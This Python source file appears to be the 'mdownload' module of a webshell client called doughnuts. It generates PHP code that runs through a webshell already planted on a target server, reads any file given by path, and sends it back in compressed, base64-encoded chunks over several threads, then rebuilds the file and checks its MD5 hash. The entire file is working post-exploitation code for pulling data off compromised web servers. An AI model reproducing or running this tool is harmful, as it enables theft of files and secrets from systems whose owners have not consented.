from os import path, remove
from base64 import b64decode
from concurrent.futures import ThreadPoolExecutor, wait
from hashlib import md5
from threading import Lock
from tempfile import NamedTemporaryFile

from tqdm import tqdm

from libs.config import alias, color, gget
from libs.myapp import send, base64_encode, gzinflate, size_to_human, human_to_size


DOWNLOAD_SUCCESS = True
PRINT_LOCK = Lock()
REQUEST_LOCK = Lock()
CHUNK_NAME_DICT = {}
BAR = None
BLOCKSIZE = 0


def get_file_md5(file_name):
    m = md5()  # ??md5??
    with open(file_name, 'rb') as fobj:
        while True:
            data = fobj.read(4096)
            if not data:
                break
            m.update(data)

    return m.hexdigest()


def get_data_php(web_file_path: str, offset: int, blocksize: int):
    return """function download($file, $offset, $size)
{
    $fp = @fopen($file,'rb');
    if ($fp){
        fseek($fp, $offset);
        echo base64_encode(gzdeflate(fread($fp, $size)));
    }
}
download(base64_decode("%s"), %s, %s);
""" % (base64_encode(web_file_path), offset, blocksize)


def get_filesize_php(web_file_path: str):
    return """echo filesize(base64_decode("%s"));
""" % (base64_encode(web_file_path))


def get_filemd5_php(web_file_path: str):
    return """echo md5_file(base64_decode("%s"));
""" % (base64_encode(web_file_path))


def get_data(web_file_path: str, n: int, offset: int, blocksize: int):
    global REQUEST_LOCK, DOWNLOAD_SUCCESS, BAR, CHUNK_NAME_DICT

    retry_time = 5
    res = None
    content = b''
    while retry_time and not content and DOWNLOAD_SUCCESS:
        with REQUEST_LOCK:
            res = send(get_data_php(web_file_path, offset, blocksize))

        retry_time -= 1
        try:
            content = res.r_content.strip()
        except Exception:
            content = b''
    with PRINT_LOCK:
        BAR.update(BLOCKSIZE)

    if (content):
        with NamedTemporaryFile('wb', delete=False) as f:
            f.write(content)
            CHUNK_NAME_DICT[n] = f.name
    else:
        DOWNLOAD_SUCCESS = False

    return (n, content)


@alias(True, _type="FILE", w="web_file_path", l="local_path", s="humansize", t="threads")
def run(
    web_file_path: str, local_path: str = "", humansize: str = "1MB", threads: int = 5
) -> bool:
    """
    mdownload

    Download file from target system by block compression and multi threads.

    eg: mdownload {web_file_path} {local_path=doughnuts/target/site.com/...} {humansize="1MB",eg="10MB"} {threads=5}
    """
    global PRINT_LOCK, DOWNLOAD_SUCCESS, BAR, BLOCKSIZE, CHUNK_NAME_DICT

    res = send(get_filesize_php(web_file_path))
    if (not res):
        return
    try:
        file_size = int(res.r_text.strip())
        print(color.green(f"Get file size: {size_to_human(file_size)}"))
    except ValueError:
        print(color.red("\nCan't get file size\n"))
        return

    res = send(get_filemd5_php(web_file_path))
    if (not res):
        return
    file_md5 = res.r_text.strip()
    print(color.green(f"Get file hash: {file_md5}"))

    if (len(file_md5) != 32):
        print(color.red("\nCan't sum file md5 hash\n"))
        return

    try:
        blocksize = human_to_size(humansize)
    except Exception:
        blocksize = file_size // 10
        print(color.yellow(
            f"Parse humansize error, set it to {size_to_human(blocksize)}"))
    if (blocksize < file_size / 1000):
        blocksize = file_size // 100
        print(color.yellow(
            f"Humansize too small, set it to {size_to_human(blocksize)}"))

    BLOCKSIZE = blocksize

    if (file_size):
        file_name = path.split(web_file_path)[1]

        download_path = local_path or gget(
            "webshell.download_path", "webshell")
        download_path = download_path.replace("\\", "/")
        file_path = path.join(download_path, file_name) if path.isdir(
            download_path) else download_path
        file_path = path.abspath(file_path)

        BAR = tqdm(total=file_size, desc="Downloading", unit_scale=True)

        with ThreadPoolExecutor(max_workers=threads) as tp:
            all_task = [tp.submit(get_data, web_file_path, n, offset, blocksize)
                        for n, offset in enumerate(range(0, file_size, blocksize))]

            done, not_done = wait(all_task, timeout=0)
            try:
                while not_done:
                    freshly_done, not_done = wait(not_done, timeout=5)
                    done |= freshly_done
                    if not DOWNLOAD_SUCCESS:
                        break
            except KeyboardInterrupt:
                DOWNLOAD_SUCCESS = False
            finally:
                for future in not_done:
                    future.cancel()
                BAR.close()

            if (not DOWNLOAD_SUCCESS):
                print(color.red("\nDownload error, can't get chunk\n"))
                for name in CHUNK_NAME_DICT.values():
                    if path.isfile(name):
                        remove(name)
                return

        with open(file_path, "wb") as fp, tqdm(total=file_size, desc="Decompressing", unit_scale=True) as bar:
            for i in range(len(all_task)):
                with open(CHUNK_NAME_DICT[i], "rb") as f:
                    content = gzinflate(b64decode(f.read()))
                    fp.write(content)
                    fp.flush()
                remove(CHUNK_NAME_DICT[i])
                bar.update(blocksize)

        local_file_md5 = get_file_md5(file_path)

        if local_file_md5 != file_md5:
            print(color.red("\nmd5 hash verify error\n"))
            remove(file_path)
        else:
            print(color.green(
                f"\nDownloaded file has been saved to {file_path}\n"))
    else:
        print(color.red("\nFile not exist / Download error\n"))
        return ''
